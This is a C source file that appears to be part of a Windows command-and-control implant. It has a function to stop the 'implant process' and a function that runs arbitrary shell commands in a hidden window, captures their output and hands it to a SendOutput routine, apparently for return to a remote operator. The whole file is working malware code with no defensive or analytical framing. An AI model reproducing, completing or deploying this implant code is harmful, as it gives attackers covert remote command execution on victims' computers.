#include <Windows.h>

// cleanly exit implant process
void ExitImplantProcess() {
    SendOutput("[+] Successfully stopped agent process");
    exit(0);
}

// execute shell command and capture output
void ExecuteWindowsShellCommand(const char *cmd) {
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hRead, hWrite;
    CreatePipe(&hRead, &hWrite, &sa, 0);

    PROCESS_INFORMATION pi;
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    BOOL success = CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (!success) {
        SendOutput("Failed to execute command");
        return;
    }

    CloseHandle(hWrite);  // Only read end needed now

    char buffer[8192] = {0};
    DWORD read = 0, total = 0;
    char output[16384] = {0};

    while (ReadFile(hRead, buffer, sizeof(buffer)-1, &read, NULL) && read > 0) {
        buffer[read] = '\0';
        strncat(output, buffer, sizeof(output) - strlen(output) - 1);
        total += read;
        if (total >= sizeof(output) - 1) break;  // Prevent overflow
        Sleep(10);  // Let the buffer fill if needed
    }

    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (strlen(output) == 0) {
        SendOutput("(no output)");
    } else {
        SendOutput(output);
    }
}
